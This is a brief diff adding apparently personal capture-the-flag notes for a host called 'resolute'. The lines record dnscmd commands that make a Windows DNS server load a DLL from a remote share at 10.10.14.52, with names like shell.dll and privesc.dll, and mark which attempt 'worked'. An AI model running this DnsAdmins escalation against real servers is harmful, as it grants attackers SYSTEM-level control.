@@ -1,0 +1,7 @@
+dnscmd.exe resolute /config /serverlevelplugindll \\10.10.14.52\tools\reverse3.dll
+not worked
+
+dnscmd RESOLUTE /config /serverlevelplugindll \10.10.14.52\dns.dll
+dnscmd RESOLUTE /config /serverlevelplugindll \10.10.14.52\privesc.dll
+dnscmd RESOLUTE /config /serverlevelplugindll \10.10.14.52\shell.dll
+worked
